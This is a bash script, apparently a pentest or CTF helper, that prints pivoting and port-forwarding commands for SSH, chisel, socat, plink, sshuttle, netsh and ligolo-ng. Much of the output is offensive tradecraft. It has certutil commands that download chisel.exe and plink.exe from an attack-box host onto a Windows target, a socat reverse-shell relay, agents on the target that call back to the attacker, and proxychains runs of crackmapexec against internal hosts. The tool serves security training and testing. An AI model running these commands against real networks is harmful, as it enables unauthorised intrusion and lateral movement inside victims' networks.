#!/bin/bash
# port_forward.sh — Generate port forwarding / pivoting syntax
#
# FOR AUTHORIZED TESTING AND CTF USE ONLY
#
# USAGE:
#   ./port_forward.sh -t ssh    -lp 8080 -rh 10.10.10.5 -rp 80
#   ./port_forward.sh -t chisel -lp 1080 -rh 10.10.10.5
#   ./port_forward.sh            (interactive mode)

TYPE=""; LHOST=""; LPORT=""; RHOST=""; RPORT=""; JH_USER=""; JUMPHOST=""

RED='\033[0;31m'; YELLOW='\033[1;33m'; GREEN='\033[0;32m'; CYAN='\033[0;36m'; BOLD='\033[1m'; RESET='\033[0m'
info()  { echo -e "${CYAN}[*] $*${RESET}"; }
good()  { echo -e "${GREEN}[+] $*${RESET}"; }
warn()  { echo -e "${YELLOW}[-] $*${RESET}"; }
cmd()   { echo -e "    ${GREEN}$*${RESET}"; }
sec()   { echo -e "\n${BOLD}${YELLOW}── $* ──${RESET}"; }
sep()   { echo -e "${BOLD}$(printf '─%.0s' {1..65})${RESET}"; }
header(){ sep; echo -e "${BOLD}${CYAN}  $*${RESET}"; sep; }

usage() {
    cat <<USAGE
port_forward.sh — Port forwarding and pivoting syntax generator

  -t <type>    Type: ssh | chisel | socat | plink | sshuttle | all
  -lh <ip>     Local/attack box IP (default: auto-detect tun0)
  -lp <port>   Local port to listen on
  -rh <ip>     Remote/target host IP
  -rp <port>   Remote port to forward
  -j <host>    Jump host IP (for SSH tunnels)
  -u <user>    SSH username for jump host
  -h           Help

Examples:
  $0 -t ssh    -lp 8080 -rh 10.10.10.5 -rp 80 -j jumphost -u user
  $0 -t chisel -lp 1080 -lh 10.10.14.5 -rh 127.0.0.1 -rp 8080
  $0 -t all    -lp 4444 -rh 172.16.1.5 -rp 4444
  $0            (no args = show all common scenarios)
USAGE
    exit 0
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        -t)  TYPE="$2";     shift 2 ;;
        -lh) LHOST="$2";    shift 2 ;;
        -lp) LPORT="$2";    shift 2 ;;
        -rh) RHOST="$2";    shift 2 ;;
        -rp) RPORT="$2";    shift 2 ;;
        -j)  JUMPHOST="$2"; shift 2 ;;
        -u)  JH_USER="$2";  shift 2 ;;
        -h|--help) usage ;;
        *) shift ;;
    esac
done

# Auto-detect attack IP
if [[ -z "$LHOST" ]]; then
    LHOST=$(ip addr show tun0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
    [[ -z "$LHOST" ]] && LHOST=$(ip addr show eth0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
    [[ -z "$LHOST" ]] && LHOST="<ATTACK_IP>"
fi

# Defaults for display
LPORT="${LPORT:-<LPORT>}"
RHOST="${RHOST:-<RHOST>}"
RPORT="${RPORT:-<RPORT>}"
JUMPHOST="${JUMPHOST:-<JUMPHOST>}"
JH_USER="${JH_USER:-user}"

[[ -z "$TYPE" ]] && TYPE="all"

header "PORT FORWARDING / PIVOTING SYNTAX"
info "Attack IP : $LHOST"
info "Local port: $LPORT  →  Remote: $RHOST:$RPORT"
echo ""

# ── SSH ───────────────────────────────────────────────────────────────────────
if [[ "$TYPE" == "ssh" || "$TYPE" == "all" ]]; then
    sec "SSH LOCAL PORT FORWARD"
    info "Access $RHOST:$RPORT on your local machine at 127.0.0.1:$LPORT"
    cmd "ssh -L ${LPORT}:${RHOST}:${RPORT} ${JH_USER}@${JUMPHOST} -N -f"
    echo ""

    sec "SSH REMOTE PORT FORWARD"
    info "Expose your local port $LPORT on the remote box at 127.0.0.1:$LPORT"
    cmd "ssh -R ${LPORT}:127.0.0.1:${LPORT} ${JH_USER}@${JUMPHOST} -N -f"
    echo ""

    sec "SSH DYNAMIC FORWARD (SOCKS5 proxy)"
    info "Route all traffic through $JUMPHOST via SOCKS5 on port $LPORT"
    cmd "ssh -D ${LPORT} ${JH_USER}@${JUMPHOST} -N -f"
    cmd "# Then use proxychains:"
    cmd "echo 'socks5 127.0.0.1 ${LPORT}' >> /etc/proxychains4.conf"
    cmd "proxychains nmap -sT -p 80,443,445 ${RHOST}"
    echo ""

    sec "SSH DOUBLE HOP (pivot through two hosts)"
    cmd "ssh -J ${JH_USER}@${JUMPHOST} user@${RHOST}"
    cmd "# Or with port forward through the chain:"
    cmd "ssh -L ${LPORT}:${RHOST}:${RPORT} -J ${JH_USER}@${JUMPHOST} user@${RHOST} -N"
    echo ""
fi

# ── Chisel ────────────────────────────────────────────────────────────────────
if [[ "$TYPE" == "chisel" || "$TYPE" == "all" ]]; then
    sec "CHISEL — REVERSE PORT FORWARD"
    info "Attack box (server):"
    cmd "chisel server --reverse --port 9001"
    echo ""
    info "Target box (client) — forward target port back to attack box:"
    cmd "chisel client ${LHOST}:9001 R:${LPORT}:127.0.0.1:${RPORT}"
    echo ""

    sec "CHISEL — SOCKS5 PROXY (access whole internal network)"
    info "Attack box:"
    cmd "chisel server --reverse --port 9001"
    echo ""
    info "Target box:"
    cmd "chisel client ${LHOST}:9001 R:1080:socks"
    echo ""
    info "Attack box — route traffic via proxychains:"
    cmd "echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf"
    cmd "proxychains crackmapexec smb ${RHOST}"
    echo ""

    sec "CHISEL — DOWNLOAD (if not on target)"
    cmd "# Attack box — serve chisel"
    cmd "./upload_and_exec.sh -f /opt/chisel_linux_amd64"
    cmd "# Windows target:"
    cmd "certutil -urlcache -f http://${LHOST}:8000/chisel.exe C:\\Windows\\Temp\\chisel.exe"
    echo ""
fi

# ── Socat ─────────────────────────────────────────────────────────────────────
if [[ "$TYPE" == "socat" || "$TYPE" == "all" ]]; then
    sec "SOCAT — TCP RELAY (on pivot host)"
    info "Forward connections on port $LPORT to $RHOST:$RPORT"
    cmd "socat TCP-LISTEN:${LPORT},fork TCP:${RHOST}:${RPORT}"
    echo ""

    sec "SOCAT — REVERSE SHELL RELAY"
    cmd "socat TCP-LISTEN:${LPORT},fork,reuseaddr TCP:${LHOST}:${LPORT}"
    echo ""
fi

# ── Plink (Windows) ──────────────────────────────────────────────────────────
if [[ "$TYPE" == "plink" || "$TYPE" == "all" ]]; then
    sec "PLINK.EXE — WINDOWS SSH CLIENT"
    info "Run on Windows target — remote forward shell port back to attack box:"
    cmd "plink.exe -R ${LPORT}:127.0.0.1:${LPORT} ${JH_USER}@${LHOST} -N"
    echo ""
    info "Local forward — access internal resource from attack box:"
    cmd "plink.exe -L ${LPORT}:${RHOST}:${RPORT} ${JH_USER}@${LHOST} -N"
    echo ""
    info "Download plink:"
    cmd "certutil -urlcache -f http://${LHOST}:8000/plink.exe C:\\Windows\\Temp\\plink.exe"
    echo ""
fi

# ── sshuttle ──────────────────────────────────────────────────────────────────
if [[ "$TYPE" == "sshuttle" || "$TYPE" == "all" ]]; then
    sec "SSHUTTLE — TRANSPARENT VPN-LIKE PROXY"
    info "Route all traffic to 172.16.x.x subnet through jump host:"
    cmd "sshuttle -r ${JH_USER}@${JUMPHOST} 172.16.0.0/16 --ssh-cmd 'ssh -i id_rsa'"
    cmd "sshuttle -r ${JH_USER}@${JUMPHOST} 0/0   # route ALL traffic"
    echo ""
fi

# ── Netsh (Windows) ───────────────────────────────────────────────────────────
if [[ "$TYPE" == "all" ]]; then
    sec "NETSH — WINDOWS PORT PROXY (run as admin on Windows pivot)"
    cmd "netsh interface portproxy add v4tov4 listenport=${LPORT} listenaddress=0.0.0.0 connectport=${RPORT} connectaddress=${RHOST}"
    cmd "netsh interface portproxy show all   # verify"
    cmd "netsh interface portproxy delete v4tov4 listenport=${LPORT} listenaddress=0.0.0.0  # cleanup"
    echo ""

    sec "LIGOLO-NG — MODERN PIVOT TOOL"
    info "Attack box (proxy):"
    cmd "ip tuntap add user root mode tun ligolo && ip link set ligolo up"
    cmd "./proxy -selfcert -laddr 0.0.0.0:11601"
    echo ""
    info "Target box (agent):"
    cmd "./agent -connect ${LHOST}:11601 -ignore-cert"
    echo ""
    info "Back on attack box in ligolo console:"
    cmd "session          # select session"
    cmd "ifconfig         # view target interfaces"
    cmd "ip route add 172.16.0.0/16 dev ligolo   # add route"
    cmd "start            # start tunnel"
    echo ""
fi

sep
info "Proxychains config: /etc/proxychains4.conf or /etc/proxychains.conf"
info "Test proxy:  proxychains curl http://${RHOST}/"
info "Nmap via proxy (TCP connect only): proxychains nmap -sT -Pn -p 80,443,445,8080 ${RHOST}"
